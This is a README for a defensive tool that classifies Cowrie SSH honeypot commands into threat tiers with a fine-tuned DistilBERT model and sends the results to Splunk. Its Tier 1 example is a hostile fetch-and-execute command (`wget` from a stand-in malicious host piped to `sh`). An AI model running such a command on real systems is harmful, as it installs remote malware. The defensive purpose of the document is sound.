# Cowrie Honeypot Log Classifier & Splunk Integration

## 1. Executive Summary
This project provides an automated, AI-driven pipeline to classify and analyze SSH honeypot logs generated by Cowrie. By integrating a fine-tuned Hugging Face `distilbert-base-uncased` model with Splunk, the system continuously analyzes attacker inputs in real-time. It categorizes malicious SSH behaviors into distinct threat tiers, allowing security teams to quickly distinguish between automated scanners, malware deployment attempts, and active human adversaries.

## 2. Architecture & Components

The system consists of three primary phases:
1. **Data Generation & Ingestion**: Synthetic data generation or real log collection from the Cowrie honeypot.
2. **Model Training & Fine-Tuning**: Adapting a DistilBERT model to recognize different classes of SSH commands.
3. **Continuous Inference & Splunk Integration**: A daemon that streams logs from Splunk, evaluates them using the trained model, and sends the AI insights back to Splunk via the HTTP Event Collector (HEC).

### 2.1 Threat Classification Tiers
The core of the AI classification mechanism relies on grouping attacker commands into three distinct labels:
- **Tier 0 (Recon Bots)**: Scripted or automated bots running basic reconnaissance commands (e.g., `whoami`, `uname -a`, `cat /proc/cpuinfo`).
- **Tier 1 (Malware Droppers)**: Automated scripts attempting to download and execute payloads (e.g., `wget http://malicious.ip/malware.sh -O -> sh`).
- **Tier 2 (Human Interactive Sessions)**: Commands indicating a live human exploring the file system, escalating privileges, or modifying configurations (e.g., `cd /var/log`, `nano /etc/passwd`, `history -c`).

### 2.2 Core Files
- **`generate_fake_logs.py`**: A utility script to generate synthetic Cowrie-formatted JSON logs. Useful for bootstrapping the model when real honeypot data is insufficient.
- **`cowrie_splunk_finetune.py`**: The training pipeline. It reads Cowrie `.json` logs, tokenizes the `"input"` command strings, trains the `distilbert-base-uncased` model for sequence classification, and saves the weights to `./saved_distilbert_cowrie/`.
- **`splunk_continuous_reader.py`**: The inference daemon. It securely connects to Splunk's REST API, streams incoming RT (Real-Time) Cowrie events, performs inference on the `"cowrie.command.input"` events, and POSTs the AI predictions back to Splunk.

## 3. Workflow & Data Flow

1. **Log Collection**: Cowrie captures an SSH session and logs the attacker's shell commands (`cowrie.command.input`). These logs are ingested into Splunk.
2. **Real-Time Streaming**: The `splunk_continuous_reader.py` script opens a persistent connection to the Splunk REST API (`/services/search/jobs/export`) using a real-time search query.
3. **AI Inference**: 
   - As new JSON events stream in, the script extracts the raw command executed by the attacker.
   - The text is tokenized and fed into the local fine-tuned DistilBERT model.
   - The model outputs a probability distribution across the three threat tiers, selecting the highest confidence label.
4. **Insights Ingestion**: The resulting insight (Model Name, Threat Label, Confidence Score, Original Command, Timestamp) is packaged into a JSON payload and pushed to Splunk via HEC.

## 4. Setup and Configuration

### Prerequisites
- Python 3.9+
- Splunk Enterprise or Splunk Cloud environment.
- Splunk HTTP Event Collector (HEC) enabled with a valid token.
- Splunk REST API accessible (default port 8089).

### Environment Configuration
The system relies on a `.env` file for secure configuration management.
```text
SPLUNK_REST_URL=https://<splunk-server>:8089
SPLUNK_USERNAME=<username>
SPLUNK_PASSWORD=<password>
SPLUNK_SEARCH_QUERY=search index=cowrie sourcetype=cowrie
SPLUNK_HEC_URL=https://<splunk-server>:8088/services/collector
SPLUNK_HEC_TOKEN=<your-hec-token>
SPLUNK_INDEX=<target-hec-index>
```

### Installation
1. Clone the repository and navigate into the directory.
2. Create and activate a Python virtual environment.
3. Install the required dependencies: `pip install -r requirements.txt`.
4. Run `python cowrie_splunk_finetune.py` to train/fine-tune the model. Ensure logs are present for training.
5. Run `python splunk_continuous_reader.py` to start the inference daemon.

## 5. Security & Considerations
- **SSL Certificates**: The current implementation of the REST API connection disables SSL verification warnings (`verify=False`). For production systems, ensure valid CA certs are configured and enabled.
- **Resource Limits**: The DistilBERT model leverages PyTorch. For high-volume honeypots, ensure the host running the inference daemon has sufficient CPU/GPU resources and memory to handle burst traffic.
